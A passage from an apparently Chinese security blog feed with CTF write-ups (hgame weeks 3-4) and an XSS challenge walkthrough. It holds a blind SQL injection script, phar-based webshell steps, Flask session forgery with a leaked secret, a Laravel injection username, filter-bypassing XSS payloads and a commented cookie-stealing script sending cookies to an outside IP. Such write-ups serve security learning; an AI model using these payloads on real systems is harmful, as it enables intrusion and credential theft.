&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'loginout'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(<span class="string">'groups'</span>, <span class="keyword">null</span>);</span><br><span class="line">        setcookie(<span class="string">'user'</span>, <span class="keyword">null</span>);</span><br><span class="line">        Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_avatar</span><span class="params">($user_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $res, <span class="string">'content'</span> =&gt; base64_encode(file_get_contents(<span class="string">'./img/avatar/'</span> . $res . <span class="string">'.png'</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_new_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> mb_strlen($message) &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">            $sql_query = <span class="string">"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"length error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'image/gif'</span> || $type == <span class="string">'image/jpeg'</span> || $type == <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $name . <span class="string">".png"</span>);</span><br><span class="line">            $sql_query = <span class="string">"update `users` set `avatar`='$name' WHERE `user_id`=$user_id"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $avatar[<span class="string">'name'</span>] . <span class="string">".png"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_password</span><span class="params">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($_SESSION[<span class="string">'user'</span>], $npassword)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"difference error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $sql_query = <span class="string">"select `password` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">            $res = sql_query($sql_query);</span><br><span class="line">            <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($res-&gt;fetch_row()[<span class="number">0</span>] === md5($opassword)) &#123;</span><br><span class="line">                    $sql_query = <span class="string">"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id"</span>;</span><br><span class="line">                    $res = sql_query($sql_query);</span><br><span class="line">                    <span class="keyword">echo</span> $res;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"oldpassword error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"groups"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"c419fq3ppu11r1o2tra4l9rlnm"</span>,</span><br><span class="line">    <span class="string">"user"</span>:<span class="string">"snowtest"</span></span><br><span class="line">&#125;</span><br><span class="line">url_del = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">message = <span class="string">"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#"</span></span><br><span class="line">avatar = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">127</span>):</span><br><span class="line">        r = requests.get(url,cookies=cookies)</span><br><span class="line">        token = re.findall(<span class="string">r"value='(.*)' id='token'&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class="number">4</span>)  </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            avatar += chr(j)</span><br><span class="line">            print(avatar)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><br>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p><p><img src="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png" alt><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p><p>然后就是文件探测了，可以使用find命令<code>snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);</code>，最终payload</p><p><img src="https://i.loli.net/2019/02/19/5c6bde110e9a2.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="BabyXss">          <a href="#BabyXss" class="heading-link"><i class="fas fa-link"></i></a>BabyXss</h2>      <p>题目环境有点问题</p><!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> -->        <h1 id="WEEK-4">          <a href="#WEEK-4" class="heading-link"><i class="fas fa-link"></i></a>WEEK-4</h1>              <h2 id="happypython">          <a href="#happypython" class="heading-link"><i class="fas fa-link"></i></a>happypython</h2>      <p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p><p><img src="https://i.loli.net/2019/02/26/5c7529f34783c.png" alt></p><p>接下来读取配置文件<code>http://118.25.18.223:3001/{{config}}</code>，可以获取到secret_key</p><p><img src="https://i.loli.net/2019/02/26/5c752a50e3200.png" alt></p><p>解一下cookie</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&#39;csrf_token&#39;: u&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;111&#39;, u&#39;_id&#39;: u&#39;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></div></figure><p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&#39;csrf_token&#39;:&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;,&#39;_fresh&#39;:True,&#39;user_id&#39;:&#39;1&#39;,&#39;_id&#39;:&#39;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></div></figure><p>然后将生成的cookie覆盖原来cookie即可得到flag</p><p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></div></figure><p>ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错<code>ValueError: dictionary update sequence element #0 has length 1; 2 is required</code>，查看了一下代码发现是在dict()函数处报错的</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></div></figure><p>但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于<code>{aa:aa}</code>，而linux下却是<code>{&#39;aa&#39;:&#39;aa&#39;}</code>，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是<code>&quot;</code>捣的鬼，在windows下我们输入的<code>&quot;</code>是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(sys.argv[i])</span><br></pre></td></tr></table></div></figure><p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \&quot;\&#39;</code>，此时输出为<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b.py</span><br><span class="line">key:value</span><br><span class="line">&#39;key&#39;:&#39;value&#39;</span><br><span class="line">&quot;\&#39;</span><br></pre></td></tr></table></div></figure></p><p>这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~）</p>        <h2 id="happyPHP">          <a href="#happyPHP" class="heading-link"><i class="fas fa-link"></i></a>happyPHP</h2>      <p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p><p>审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计</p><p><img src="https://i.loli.net/2019/02/27/5c75e272afb23.png" alt></p><p>可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。</p><p>app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">        session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">    session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为<code>&#39; union select group_concat(email,password) from users where id=1#</code>，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></div></figure><p>密码是经过加密的，解密一下</p><blockquote><p>{“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”}</p></blockquote><p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;key&#39; &#x3D;&gt; env(&#39;APP_KEY&#39;),</span><br><span class="line">&#39;cipher&#39; &#x3D;&gt; &#39;AES-256-CBC&#39;,</span><br></pre></td></tr></table></div></figure></p><p>回滚git版本找到key值</p><blockquote><p>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</p></blockquote><p>接下来编写解密脚本<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class="line">enc = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">iv = base64.b64decode(iv)</span><br><span class="line">value = base64.b64decode(value)</span><br><span class="line">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class="line">con = cryptor.decrypt(value)</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></div></figure></p><p>可以得到密码为<code>9pqfPIer0Ir9UUfR</code>，登录即可得到flag</p><p><img src="https://i.loli.net/2019/02/27/5c75f88d0fb45.png" alt></p><p><strong><em>Reference：</em></strong></p><ol><li><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link" href="https://zry.io/archives/183" target="_blank" rel="noopener">https://zry.io/archives/183</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week-3&quot;&gt;
          &lt;a href=&quot;#week-3&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;week-3&lt;/h1&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XSS20冲关之旅</title>
    <link href="http://chaosec.top/2019/03/02/xss20/"/>
    <id>http://chaosec.top/2019/03/02/xss20/</id>
    <published>2019-03-01T16:09:49.000Z</published>
    <updated>2019-05-20T12:32:32.015Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>最近学到了xss漏洞，来做一下这个xss题目</p><a id="more"></a>        <h1 id="XSS-1">          <a href="#XSS-1" class="heading-link"><i class="fas fa-link"></i></a>XSS-1</h1>      <p>第一关热身，没有任何过滤。payload：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>        <h1 id="XSS-2">          <a href="#XSS-2" class="heading-link"><i class="fas fa-link"></i></a>XSS-2</h1>      <p>查看代码可知<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></div></figure></p><p>对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签</p><p>payload: <code>keyword=&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，此时在代码中input标签的内容就变成<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword value&#x3D;&quot;&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></div></figure></p><p>成功成为了两个标签从而xss成功</p>        <h1 id="XSS-3">          <a href="#XSS-3" class="heading-link"><i class="fas fa-link"></i></a>XSS-3</h1>      <p>这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过</p><p>payload: <code>http://localhost/xss20/level3.php?keyword=&#39; onclick=&#39;window.alert()&#39;</code></p><p><img src="https://i.loli.net/2019/03/01/5c78e10f13d0e.png" alt></p>        <h1 id="XSS-4">          <a href="#XSS-4" class="heading-link"><i class="fas fa-link"></i></a>XSS-4</h1>      <p>我们可以先fuzz一下，输入<code>&lt;script&gt;&#39;&quot;</code>，然后查看源代码可知</p><p><img src="https://ww1.yunjiexi.club/2019/03/01/DNhiB.png" alt></p><p>可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level4.php?keyword&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot;</span><br></pre></td></tr></table></div></figure>        <h1 id="XSS-5">          <a href="#XSS-5" class="heading-link"><i class="fas fa-link"></i></a>XSS-5</h1>      <p>想上一关测试一下<code>&lt;script&gt;&#39;&quot;</code>，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤<code>&lt;&gt;</code>，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level5.php?keyword&#x3D;&quot;&gt;&lt;a href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></div></figure></p><p>查看源代码可知题目采用黑名单过滤了<code>&lt;script</code>和<code>on</code>两个敏感词</p>        <h1 id="XSS-6">          <a href="#XSS-6" class="heading-link"><i class="fas fa-link"></i></a>XSS-6</h1>      <p>测试<code>&lt;script&gt;&#39;&quot;on</code>，发现还是基本和上关的过滤一样，<code>&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;&#39;&quot;o_n&quot;&gt;</code>，用上题payload故技重施，发现并没有那么简单，<code>href</code>被置换成了<code>hr_ef</code>，继续测试<code>data,action,formaction</code>，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀…<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level6.php?keyword&#x3D;&quot;&gt;&lt;a Href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></div></figure></p>        <h1 id="XSS-7">          <a href="#XSS-7" class="heading-link"><i class="fas fa-link"></i></a>XSS-7</h1>      